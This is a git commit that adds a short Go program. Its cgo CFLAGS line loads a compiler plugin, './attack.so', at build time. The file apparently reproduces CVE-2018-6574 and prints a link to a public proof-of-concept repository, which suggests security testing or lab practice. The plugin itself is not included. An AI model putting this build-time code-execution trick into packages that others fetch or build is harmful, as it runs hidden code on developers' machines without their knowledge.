37fb286b4e39e6814fd968af1c1a136282a837e3
Eugen T. Morar <eugenmorar@users.noreply.github.com>
2019-11-22 09:45:05 +0200

    save main.go

---
+++ main.go
@@ -0,0 +1,16 @@
+package main
+
+/*
+#cgo linux CFLAGS: -fplugin=./attack.so
+
+void echo() {
+  printf("link: https://github.com/neargle/CVE-2018-6574-POC");
+}
+*/
+
+import "C"
+
+func main() {
+	C.echo()
+	return
+}
